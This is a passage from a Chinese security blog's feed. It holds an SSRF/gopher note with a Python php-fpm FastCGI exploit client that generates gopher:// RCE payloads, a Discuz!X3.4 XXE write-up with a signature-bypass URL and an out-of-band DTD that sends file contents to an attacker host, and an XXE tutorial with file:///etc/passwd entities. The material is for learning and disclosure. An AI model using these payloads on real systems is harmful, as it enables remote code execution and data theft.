punctuation">(</span>name<span class="token punctuation">)</span>                value <span class="token operator">=</span> force_bytes<span class="token punctuation">(</span>value<span class="token punctuation">)</span>                paramsRecord <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeNameValueParams<span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span>        <span class="token keyword">if</span> paramsRecord<span class="token punctuation">:</span>            request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_PARAMS<span class="token punctuation">,</span> paramsRecord<span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>        request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_PARAMS<span class="token punctuation">,</span> b<span class="token string">''</span><span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>        <span class="token keyword">if</span> post<span class="token punctuation">:</span>            request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDIN<span class="token punctuation">,</span> force_bytes<span class="token punctuation">(</span>post<span class="token punctuation">)</span><span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>        request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDIN<span class="token punctuation">,</span> b<span class="token string">''</span><span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print base64.b64encode(request)</span>        <span class="token keyword">return</span> request        <span class="token comment" spellcheck="true"># self.sock.send(request)</span>        <span class="token comment" spellcheck="true"># self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND</span>        <span class="token comment" spellcheck="true"># self.requests[requestId]['response'] = b''</span>        <span class="token comment" spellcheck="true"># return self.__waitForResponse(requestId)</span>    <span class="token keyword">def</span> <span class="token function">__waitForResponse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> requestId<span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> b<span class="token string">''</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            buf <span class="token operator">=</span> self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token operator">not</span> len<span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            data <span class="token operator">+=</span> buf        data <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> self<span class="token punctuation">.</span>__decodeFastCGIRecord<span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token operator">not</span> response<span class="token punctuation">:</span>                <span class="token keyword">break</span>            <span class="token keyword">if</span> response<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDOUT \                    <span class="token operator">or</span> response<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDERR<span class="token punctuation">:</span>                <span class="token keyword">if</span> response<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDERR<span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span><span class="token string">'state'</span><span class="token punctuation">]</span> <span class="token operator">=</span> FastCGIClient<span class="token punctuation">.</span>FCGI_STATE_ERROR                <span class="token keyword">if</span> requestId <span class="token operator">==</span> int<span class="token punctuation">(</span>response<span class="token punctuation">[</span><span class="token string">'requestId'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'response'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> response<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> response<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> FastCGIClient<span class="token punctuation">.</span>FCGI_STATE_SUCCESS<span class="token punctuation">:</span>                self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'response'</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">__repr__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"fastcgi connect host:{} port:{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>host<span class="token punctuation">,</span> self<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">'Php-fpm code execution vulnerability client.'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'host'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'Target host, such as 127.0.0.1'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'A php file absolute path, such as /usr/local/lib/php/System.php'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-c'</span><span class="token punctuation">,</span> <span class="token string">'--code'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'What php code your want to execute'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-p'</span><span class="token punctuation">,</span> <span class="token string">'--port'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'FastCGI port'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">9000</span><span class="token punctuation">,</span> type<span class="token operator">=</span>int<span class="token punctuation">)</span>    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    client <span class="token operator">=</span> FastCGIClient<span class="token punctuation">(</span>args<span class="token punctuation">.</span>host<span class="token punctuation">,</span> args<span class="token punctuation">.</span>port<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    params <span class="token operator">=</span> dict<span class="token punctuation">(</span><span class="token punctuation">)</span>    documentRoot <span class="token operator">=</span> <span class="token string">"/"</span>    uri <span class="token operator">=</span> args<span class="token punctuation">.</span>file    content <span class="token operator">=</span> args<span class="token punctuation">.</span>code    params <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'GATEWAY_INTERFACE'</span><span class="token punctuation">:</span> <span class="token string">'FastCGI/1.0'</span><span class="token punctuation">,</span>        <span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>        <span class="token string">'SCRIPT_FILENAME'</span><span class="token punctuation">:</span> documentRoot <span class="token operator">+</span> uri<span class="token punctuation">.</span>lstrip<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'SCRIPT_NAME'</span><span class="token punctuation">:</span> uri<span class="token punctuation">,</span>        <span class="token string">'QUERY_STRING'</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>        <span class="token string">'REQUEST_URI'</span><span class="token punctuation">:</span> uri<span class="token punctuation">,</span>        <span class="token string">'DOCUMENT_ROOT'</span><span class="token punctuation">:</span> documentRoot<span class="token punctuation">,</span>        <span class="token string">'SERVER_SOFTWARE'</span><span class="token punctuation">:</span> <span class="token string">'php/fcgiclient'</span><span class="token punctuation">,</span>        <span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">:</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>        <span class="token string">'REMOTE_PORT'</span><span class="token punctuation">:</span> <span class="token string">'9985'</span><span class="token punctuation">,</span>        <span class="token string">'SERVER_ADDR'</span><span class="token punctuation">:</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>        <span class="token string">'SERVER_PORT'</span><span class="token punctuation">:</span> <span class="token string">'80'</span><span class="token punctuation">,</span>        <span class="token string">'SERVER_NAME'</span><span class="token punctuation">:</span> <span class="token string">"localhost"</span><span class="token punctuation">,</span>        <span class="token string">'SERVER_PROTOCOL'</span><span class="token punctuation">:</span> <span class="token string">'HTTP/1.1'</span><span class="token punctuation">,</span>        <span class="token string">'CONTENT_TYPE'</span><span class="token punctuation">:</span> <span class="token string">'application/text'</span><span class="token punctuation">,</span>        <span class="token string">'CONTENT_LENGTH'</span><span class="token punctuation">:</span> <span class="token string">"%d"</span> <span class="token operator">%</span> len<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'PHP_VALUE'</span><span class="token punctuation">:</span> <span class="token string">'auto_prepend_file = php://input'</span><span class="token punctuation">,</span>        <span class="token string">'PHP_ADMIN_VALUE'</span><span class="token punctuation">:</span> <span class="token string">'allow_url_include = On'</span>    <span class="token punctuation">}</span>    response <span class="token operator">=</span> client<span class="token punctuation">.</span>request<span class="token punctuation">(</span>params<span class="token punctuation">,</span> content<span class="token punctuation">)</span>    response <span class="token operator">=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>response<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"gopher://127.0.0.1:"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>args<span class="token punctuation">.</span>port<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/_"</span> <span class="token operator">+</span> response<span class="token punctuation">)</span></code></pre><p>使用</p><pre><code>python exp.py -c phpcode -p port host filename</code></pre><p>想写入什么都可。<br>这里需要注意的是，PHP-FRM在接收到请求时，会首先查看要操作的文件是否存在，因此这里需要提供filename并且为已知路径的php文件。</p><h2 id="0x08-其他攻击面"><a href="#0x08-其他攻击面" class="headerlink" title="0x08 其他攻击面"></a>0x08 其他攻击面</h2><p>在一直内网的服务的时候也可以直接通过构造payload直接攻击等<br>基于 TCP Stream 且不做交互的点都可以进行攻击利用：</p><ul><li>HTTP GET/POST</li><li>Redis</li><li>Memcache</li><li>SMTP</li><li>Telnet</li><li>基于一个 TCP 包的 exploit</li><li>FTP（不能实现上传下载文件，但是在有回显的情况下可用于爆破内网 FTP）</li></ul><h2 id="0x09-Gopher的局限性"><a href="#0x09-Gopher的局限性" class="headerlink" title="0x09 Gopher的局限性"></a>0x09 Gopher的局限性</h2><ul><li>大部分 PHP 并不会开启 fopen 的 gopher wrapper</li><li>file_get_contents 的 gopher 协议不能 URLencode</li><li>file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败</li><li>PHP 的 curl 默认不 follow 302 跳转</li><li>curl/libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49 可用</li></ul><p>以上摘自<img src="https://blog.chaitin.cn/gopher-attack-surfaces/" alt><br>记录一下踩坑，感觉这些坑多是在ssrf实际操作中存在的，这次gopher的测试其实全是在本地，没与ssrf联动</p><h2 id="0x10-总结"><a href="#0x10-总结" class="headerlink" title="0x10 总结"></a>0x10 总结</h2><p>gopher协议到目前也就学个皮毛，还能更加深入，但是没有必要，等以后需要的时候再回来看。感觉貌似在了解协议之后都可以进行伪造……<br>其次，这次学习，很多点也都没有深入哈，到时候遇到了再细究把，现阶段的任务不是紧追这一个点<br>同时这算是ssrf篇的延申，思维导图会加到ssrf上，这里放个分支</p><h2 id="0x11-PS-思维导图"><a href="#0x11-PS-思维导图" class="headerlink" title="0x11 PS 思维导图"></a>0x11 PS 思维导图</h2><p><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200401191720.png" alt></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://zhuanlan.zhihu.com/p/112055947" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/112055947</a><br><a href="https://k-ring.github.io/2019/05/31/%E5%AF%B9%E4%B8%87%E9%87%91%E6%B2%B9gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%90%86%E8%A7%A3%E4%B8%8E%E5%BA%94%E7%94%A8/" target="_blank" rel="noopener">https://k-ring.github.io/2019/05/31/%E5%AF%B9%E4%B8%87%E9%87%91%E6%B2%B9gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%90%86%E8%A7%A3%E4%B8%8E%E5%BA%94%E7%94%A8/</a><br><a href="https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/</a><br><a href="https://www.smi1e.top/%E6%B5%85%E6%9E%90ssrf%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BBredis/" target="_blank" rel="noopener">https://www.smi1e.top/%E6%B5%85%E6%9E%90ssrf%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BBredis/</a><br><a href="https://www.kingkk.com/2018/08/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E4%B8%8Essrf%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">https://www.kingkk.com/2018/08/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E4%B8%8Essrf%E5%88%A9%E7%94%A8/</a></p><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Discuz!X3.4前台XXE漏洞</title>
      <link href="/1944236470.html"/>
      <url>/1944236470.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h2><p>比较幸运，刚学完XXE漏洞，转身给我爆了一个XXE。不过有php版本限制</p><h2 id="0x02漏洞环境"><a href="#0x02漏洞环境" class="headerlink" title="0x02漏洞环境"></a>0x02漏洞环境</h2><p>Discuz!X3.4最新版<br>php5.4.45</p><h2 id="0x03影响范围"><a href="#0x03影响范围" class="headerlink" title="0x03影响范围"></a>0x03影响范围</h2><p>漏洞点出在dz中的微信接口处，经过测试需要PHP&lt;=5.4.45因为高版本中的<code>simplexml_load_string</code>已经不在默认加载LIBXML_NOENT，合理猜测所有有微信插件的版本都可能存在，因为没找到旧版本就没测试。</p><h2 id="0x04漏洞分析"><a href="#0x04漏洞分析" class="headerlink" title="0x04漏洞分析"></a>0x04漏洞分析</h2><p>漏洞文件：/source/plugin/wechat/wechat.lib.class.php<br><img src="/1944236470/1.png" alt><br>可以发现<code>simplexml_load_string</code>中的<code>$postdata</code>我们可以控制（可以看一下<code>simplexml_load_string</code>新版本和旧版本的区别），而到这只经过了两次<code>_checkSignature</code>，跟进看一下<br><img src="/1944236470/2.png" alt><br>大致就是进行一个token的检验，其中参数可控，而如果我们知道token的值就能进行伪造，看一下token是如何传进来的，发现是在实体化WeChatServer类的时候进行的初始化<br><img src="/1944236470/3.png" alt><br>直接全局搜索<code>WeChatServer</code><br>在文件/source/plugin/mobile/api/4/wechat.php中进行了实体化<br><img src="/1944236470/4.png" alt><br><code>$_G[&#39;wechat&#39;][&#39;setting&#39;][&#39;wechat_token&#39;]</code>就是我们的token，是由<code>$_G[&#39;setting&#39;][&#39;mobilewechat&#39;]</code>反序列化来的，我们调试一下看看mobilewechat的值，先找一下入口文件，位置在<code>/source/plugin/mobile/mobilie.php</code><br><img src="/1944236470/5.png" alt><br>构造url:<code>http://127.0.0.1/source/plugin/mobile/mobile.php?module=wechat</code><br><img src="/1944236470/6.png" alt><br>可以发现默认的mobilewechat是null，而这样的话token也是null，<br><img src="/1944236470/7.png" alt><br>直接跟进到<code>_checkSignature</code>函数，看<code>$tmpStr</code>的值<br><img src="/1944236470/8.png" alt><br>可以看到<code>$tmpStr</code>的值就是一个3个空值数组的sha1值，此时<code>$tmpStr</code>可知，可直接通过<code>$signatur</code>传值绕过。至此，我们就可以通过<code>$postdata</code>穿payload进行XXE。我们在回头看一下wexin_token的值是怎么产生的<br>文件位置<code>source\plugin\wechat\install\checkupdate.inc.php</code><br><img src="/1944236470/9.png" alt><br>回溯发现，wechat_token是随机产生的一个16位字符，不可控。<br><img src="/1944236470/10.png" alt><br>这里也可以知道为什么token为null了，只有在安装了微信插件的时候才会生成token，而默认配置则是空，这就能直接前台xxe了<br><img src="/1944236470/11.jpg" alt><br>再继续看，既然token不可控，在看是否能获取。发现，在后台微信设置处能进行设置，但这就要后台权限了。懒得上图了……<br>总结：攻击思路两条，1.默认配置–》token=null–》xxe      2.开启微信插件–》后台–》获取token–&gt;xxe</p><h2 id="0x05漏洞复现"><a href="#0x05漏洞复现" class="headerlink" title="0x05漏洞复现"></a>0x05漏洞复现</h2><p>不多bb，无回显的xxe，需要oob。<br>url=<code>http://www.123.com/source/plugin/mobile/mobile.php?module=wechat&amp;signature=da39a3ee5e6b4b0d3255bfef95601890afd80709</code></p><p>然后post：</p><pre><code>&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;%remote;%int;%send;]&gt;</code></pre><p>test.dtd：</p><pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C:/test.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://ip:10888?p=%file;&#39;&gt;&quot;&gt;</code></pre><p>可以看到vps上成功拿到了test.txt的base64后的数据<br><img src="/1944236470/11.png" alt></p><h2 id="0x06漏洞修复"><a href="#0x06漏洞修复" class="headerlink" title="0x06漏洞修复"></a>0x06漏洞修复</h2><ol><li>禁用外部实体<br><code>libxml_disable_entity_loader(true);</code></li><li>黑名单过滤<br>对一下字符进行过滤<br><code>&lt;!DOCTYPE、&lt;!ENTITY、SYSTEM、PUBLIC</code></li></ol><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Discuz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞学习笔记</title>
      <link href="/3842592324.html"/>
      <url>/3842592324.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>今天代码审计，看到一个类似有xxe漏洞的点，但是对这个漏洞不熟悉，就整理学习一下。</p><h2 id="0x02-XXE漏洞介绍"><a href="#0x02-XXE漏洞介绍" class="headerlink" title="0x02 XXE漏洞介绍"></a>0x02 XXE漏洞介绍</h2><p>XXE（XML外部实体注入，XML External Entity) ，在应用程序<strong>解析</strong>XML输入时，当<strong>允许引用外部实体</strong>时，可构造恶意内容，导致读取任意文件、探测内网端口、攻击内网网站、发起DoS拒绝服务攻击、执行系统命令等。</p><p>通过上面的简介xxe漏洞的关键点（是否可以解析并能加载外部实体）和危害一目了然</p><h2 id="0x03-前置知识"><a href="#0x03-前置知识" class="headerlink" title="0x03 前置知识"></a>0x03 前置知识</h2><p>XXE漏洞是基于XML，首先我们就要对XML有所了解</p><h3 id="3-1什么是XML？"><a href="#3-1什么是XML？" class="headerlink" title="3.1什么是XML？"></a>3.1什么是XML？</h3><p>较为官方的描述：</p><ul><li>XML 指可扩展标记语言（EXtensible Markup Language）。</li><li>XML 是一种很像HTML的标记语言。</li><li>XML 的设计宗旨是传输数据，而不是显示数据。</li><li>XML 标签没有被预定义。您需要自行定义标签。</li><li>XML 被设计为具有自我描述性。</li><li>XML 是 W3C 的推荐标准。</li></ul><p>说实话，看这个没咋看懂，我的理解是XML应该是一种数据格式，用来说明数据，容易让人理解，有点类似于json</p><h3 id="3-2XML用来做什么？"><a href="#3-2XML用来做什么？" class="headerlink" title="3.2XML用来做什么？"></a>3.2XML用来做什么？</h3><p>感觉XML作用类似于JSON，不过当时json还没发育，同时XML也是一种可扩展的html。目前应该主要用来存储和交换数据，同时也用于一些配置文件。以上的一切都基于XML跨平台进行数据交互方便</p><h3 id="3-3XML文档结构和语法"><a href="#3-3XML文档结构和语法" class="headerlink" title="3.3XML文档结构和语法"></a>3.3XML文档结构和语法</h3><p>语法:</p><ol><li>XML元素都必须有关闭标签。</li><li>XML 标签对大小写敏感。</li><li>XML 必须正确地嵌套。</li><li>XML 文档必须有根元素。</li><li>XML 的属性值须加引号。</li></ol><p>结构:</p><ol><li>XML 文档声明，在文档的第一行</li><li>XML 文档类型定义，即DTD，XXE 漏洞所在的地方</li><li>XML 文档元素</li></ol><h3 id="3-4DTD"><a href="#3-4DTD" class="headerlink" title="3.4DTD"></a>3.4DTD</h3><p>DTD（文档类型定义，Document Type Definition）的作用是定义 XML 文档的合法构建模块。它使用一系列的合法元素来定义文档结构。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)。</p><h4 id="3-4-1DTD文档组成"><a href="#3-4-1DTD文档组成" class="headerlink" title="3.4.1DTD文档组成"></a>3.4.1DTD文档组成</h4><p>一个DTD文档包含:</p><ol><li>元素（ELEMENT）的定义规则；</li><li>元素之间的关系规则；</li><li>属性（ATTLIST）的定义规则；</li><li>可使用的实体（ENTITY）或符号（NOTATION）规则。<br>```xml<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE poem [                            <--根元素的名称 <!ELEMENT poem (author, title, content)>   &lt;—-子元素的名称及顺序 <!ELEMENT author (#PCDATA)>   &lt;—–子元素的数据类 <!ELEMENT title (#PCDATA)> <!ELEMENT content (#PCDATA)>]&gt;                              &lt;—结束标签<br>&lt;!–为元素poem定义了三个子元素author title content，<br>这三个元素必须要出现并且必须按照这个顺序<br>少元素不行，多元素也不行</li></ol><p>–&gt;</p><!--以此为分界,上面为DTO文档,下面是XML文档--><!--指明author,title,content里面的内容是字符串类型--><poem>    <author>王维</author>    <title>鹿柴</title>    <content>空山不见人，但闻人语声。返景入深林，复照青苔上。</content></poem>```<h4 id="3-4-2DTD元素"><a href="#3-4-2DTD元素" class="headerlink" title="3.4.2DTD元素"></a>3.4.2DTD元素</h4><p>元素声明方法:<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112151211-bf0da054-051b-1.png" alt></p><h5 id="3-4-2-1-PCDATA"><a href="#3-4-2-1-PCDATA" class="headerlink" title="3.4.2.1 PCDATA"></a>3.4.2.1 PCDATA</h5><p>PCDATA 的意思是被解析的字符数据（parsed character data）。可把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。不过，被解析的字符数据不应当包含任何 &amp; &lt; &gt; 字符；需要使用 &amp; &lt; &gt; 实体来分别替换它们。</p><h5 id="3-4-2-2-CDATA"><a href="#3-4-2-2-CDATA" class="headerlink" title="3.4.2.2 CDATA"></a>3.4.2.2 CDATA</h5><p>CDATA 的意思是字符数据（character data）。CDATA 是不会被解析器解析的文本。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p><h5 id="3-4-2-3-实体引用字符"><a href="#3-4-2-3-实体引用字符" class="headerlink" title="3.4.2.3 实体引用字符"></a>3.4.2.3 实体引用字符</h5><p><img src="/3842592324/3.png" alt></p><h5 id="3-4-2-4-CDATA和PCDATA区别"><a href="#3-4-2-4-CDATA和PCDATA区别" class="headerlink" title="3.4.2.4 CDATA和PCDATA区别"></a>3.4.2.4 CDATA和PCDATA区别</h5><p>按照我的理解就是PCDATA会解析所有字符,如果冲突就会报错,而CDATA则不解析仍和字符.</p><h4 id="3-4-3DTD引用方式"><a href="#3-4-3DTD引用方式" class="headerlink" title="3.4.3DTD引用方式:"></a>3.4.3DTD引用方式:</h4><ul><li>DTD内部声明<br><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></li><li>DTD外部引用<br><code>&lt;!DOCTYPE 根元素名称 SYSTEM “外部DTD的URI”&gt;</code></li><li>引用公共DTD<br><code>&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</code></li></ul><h3 id="3-5-实体"><a href="#3-5-实体" class="headerlink" title="3.5 实体"></a>3.5 实体</h3><p>实体可以理解成变量,给一段代码或数据起一个名字,方便在别的地方引用.<br>大致分为两类:</p><ol><li>一般实体(格式：&amp;实体引用名;)</li><li>参数实体(格式：%实体引用名;)</li></ol><p>其次还有内外之分,外部实体表示外部文件的内容,用 SYSTEM 关键词表示.而造成XXE的一般就是外部实体</p><h5 id="3-5-1-一般实体"><a href="#3-5-1-一般实体" class="headerlink" title="3.5.1 一般实体"></a>3.5.1 一般实体</h5><ol><li><p>一般内部实体<br>格式:<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code><br>举例:以下就声明了x,y两个内部实体</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE root [ &lt;!ENTITY x "Hello"></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">y</span> <span class="token attr-name">"World!"</span><span class="token punctuation">></span></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span><span class="token entity" title="&x;">&amp;x;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>y</span><span class="token punctuation">></span></span><span class="token entity" title="&y;">&amp;y;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>y</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre></li><li><p>一般外部实体<br>外部实体表示外部文件的内容<br>格式:<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code><br>举例:</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM "file:///etc/passwd"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><h5 id="3-5-2-参数实体"><a href="#3-5-2-参数实体" class="headerlink" title="3.5.2 参数实体"></a>3.5.2 参数实体</h5><p>参数实体使用<code>% 实体名(这里面空格不能少)</code>在 DTD 中定义，并且只能在 DTD 中使用<code>%实体名;</code>引用</p></li><li><p>内部参数实体<br>格式:<code>&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</code></p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE a [ &lt;!ENTITY % name "test"></span> %name;]></code></pre></li><li><p>外部参数实体<br>格式:<code>&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</code><br>举例:</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE a [ &lt;!ENTITY % name SYSTEM "file:///etc/passwd"></span> %name;]></code></pre><h5 id="3-5-3外部实体支持的协议"><a href="#3-5-3外部实体支持的协议" class="headerlink" title="3.5.3外部实体支持的协议"></a>3.5.3外部实体支持的协议</h5><p>更多协议的引入这就提供了更多操作空间<br><img src="https://thief.one/upload_image/20170620/1.png" alt></p></li></ol><h2 id="0x04-XXE攻击方式"><a href="#0x04-XXE攻击方式" class="headerlink" title="0x04 XXE攻击方式"></a>0x04 XXE攻击方式</h2><p>基本的前置知识就上面这些,其实通过后面的实体,攻击的思路基本就出来了,就是利用外部实体来进行攻击,具体看下面(php&gt;=5.38的版本当中,需要声明LIBXML_NOENT,高版本的php不在默认解析实体)<br>LIBXML_NOENT的官方含义过于简短,大概就是允许替换外部或非外部的XML字符实体引用,踩得坑记一下.</p><h3 id="4-1有回显的文件读取"><a href="#4-1有回显的文件读取" class="headerlink" 